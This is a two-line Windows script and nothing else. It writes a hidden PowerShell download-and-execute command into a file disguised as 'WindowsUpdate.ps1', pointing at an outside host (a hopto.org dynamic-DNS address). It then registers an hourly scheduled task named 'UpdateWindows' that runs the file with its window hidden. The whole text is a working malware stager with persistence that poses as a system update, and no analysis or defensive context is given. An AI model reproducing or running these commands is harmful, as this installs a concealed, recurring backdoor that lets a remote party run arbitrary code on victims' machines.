echo "powershell.exe -nop -w hidden -c $('"') IEX ((new-object net.webclient).downloadstring('http://gh0st1nth3sh3ll.hopto.org:443/a'))$('"')"  > C:\Users\$env:USERNAME\AppData\WindowsUpdate.ps1                           
schtasks.exe /create /sc HOURLY /tn UpdateWindows /tr "powershell.exe -nop -w hidden -file C:\Users\$env:USERNAME\AppData\WindowsUpdate.ps1" /f
